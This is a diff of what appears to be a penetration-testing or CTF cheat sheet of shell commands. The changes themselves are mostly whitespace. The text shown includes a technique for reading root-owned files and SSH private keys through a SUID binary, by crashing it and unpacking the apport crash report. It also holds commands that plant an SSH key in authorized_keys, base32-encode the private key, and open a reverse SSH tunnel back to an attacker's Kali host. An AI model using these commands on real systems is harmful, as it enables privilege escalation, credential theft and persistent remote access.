@@ -3,7 +3,7 @@
 $ IP: for adaptername in $(for i in "$(ip a s | sort -r | grep -E $'[[:digit:]]:[ ]')"; do echo $(echo $i | awk '{print $2}' | replace : ''); done); do ip a s $adaptername | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1 ; done | uniq
 
 
-# suid file reads 
+# suid file reads
 echo "#read file (/root/root.txt | /root/.ssh/id_rsa | /home/someuser/.ssh/id_rsa) with program with suid and then crash it (ps -aux | grep './program_name' | head -n 1 | awk '{print $2}' | xargs kill -SIGSEGV)
 rm -r /tmp/crash-report
 apport-unpack _opt_count.1000.crash /tmp/crash-report"
@@ -34,4 +34,3 @@ sudo -u limited-user ssh-keygen -t rsa -q -N "" -f "/home/limited-user/.ssh/id_r
 sudo -u limited-user cp /home/limited-user/.ssh/id_rsa.pub /home/limited-user/.ssh/authorized_keys
 export LIMITED_USER_ID_RSA_BASE32=$(cat /home/limited-user/.ssh/id_rsa | base32 -w 0)
 echo "echo '$(echo $LIMITED_USER_ID_RSA_BASE32)' | base32 -d > /tmp/id_rsa_LIMITED_USER_ID;chmod 600 /tmp/id_rsa_LIMITED_USER_ID; ssh -i /tmp/id_rsa_LIMITED_USER_ID -N -R <kali_port>:localhost:<remote_port> limited-user@<IP>" | xclip -selection clipboard
-
